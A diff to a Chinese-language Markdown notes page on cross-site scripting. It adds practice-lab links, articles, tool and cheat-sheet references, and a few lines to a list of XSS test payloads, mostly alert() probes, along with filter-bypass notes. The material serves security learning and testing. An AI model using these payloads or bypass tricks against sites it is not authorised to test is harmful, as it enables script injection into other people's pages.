@@ -46,12 +46,13 @@
     然后访问 xxx.xxx.xxx.xxx/1.php?parm= 加上你的xss代码
 
     **进阶版**
-    - [xss 练习源码](../../assets/file/安全/xss练习源码.zip)
+    - [xss 练习源码](../../../../assets/file/安全/xss练习源码.zip)
     - [XSS 通关小游戏以及我的挑战思路分享](https://bbs.ichunqiu.com/thread-15664-1-1.html)
 
     **在线版**
     - http://demo.testfire.net/
     - https://juice-shop.herokuapp.com/#/search
+    - https://xsschop.chaitin.cn/demo/
 
 **文章**
 - [XSS 插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
@@ -61,6 +62,7 @@
 - [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
 - [深入理解浏览器解析机制和 XSS 向量编码](http://bobao.360.cn/learning/detail/292.html)
 - [csp 与 bypass 的探讨(译文)](http://wutongyu.info/csp-2015/)
+- [XSS绕过某盾](https://xz.aliyun.com/t/6652)
 
 **工具**
 - [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - 凑合着用吧,效果一般
@@ -82,11 +84,13 @@
         ```
 
 - [faizann24/XssPy](https://github.com/faizann24/XssPy)
+- [XSS Fuzzer](https://xssfuzzer.com/fuzzer.html)
 
 **payload**
 - [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
 - [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 - [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 **tips**
 - **Firefox 关闭 xss 过滤器**
@@ -111,6 +115,7 @@
 <script>alert(String.fromCharCode(49,49))</script>
 <<SCRIPT>alert("XSS");
 //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script///////////////////////////////////////////////>alert(123)</script>
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
 <svg><script>123<1>alert(123)</script>
 "><script>alert(123)</script>
@@ -158,7 +163,7 @@ Script 标签可以用于定义一个行内的脚本或者从其他地方加载�
 <video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
 
 <audio>
-<audio src=x  onerror=alert("xss");>
+<audio src=x onerror=alert("xss");>
 
 <body>
 
@@ -254,6 +259,8 @@ background属性
 
 <portal id="q" src="bing.com" onload="print(q.activate())"></portal>
 ```
+
+---
 
 ## 绕过方法
 1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等；
